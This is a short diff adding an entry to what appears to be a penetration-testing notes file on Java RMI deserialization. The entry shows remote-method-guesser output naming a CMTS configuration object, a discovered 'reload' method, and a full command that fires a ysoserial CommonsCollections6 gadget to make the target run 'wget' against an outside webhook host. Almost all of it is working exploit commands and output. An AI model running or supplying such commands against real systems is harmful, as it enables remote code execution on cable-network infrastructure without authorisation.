@@ -103,3 +103,12 @@ java -jar rmg-5.1.0-jar-with-dependencies.jar serial xxxx 1099 CommonsCollection
       references:
         - https://github.com/qtc-de/remote-method-guesser#serial
 
+3------------------------------------------------------------------------
+
+[+]     - CMTS_CONFIG
+[+]             --> hu.ikron.inca.docsis.servers.cmts.RemoteConfigurator 
+
+method discovered :
+String reload(String var1)
+
+java -jar rmg-5.1.0-jar-with-dependencies.jar serial xx 1099 CommonsCollections6 'wget http://webhook.site/xx' --signature 'String reload(String var1)' --bound-name CMTS_CONFIG --yso /root/Desktop/yso/ysoserial-all.jar
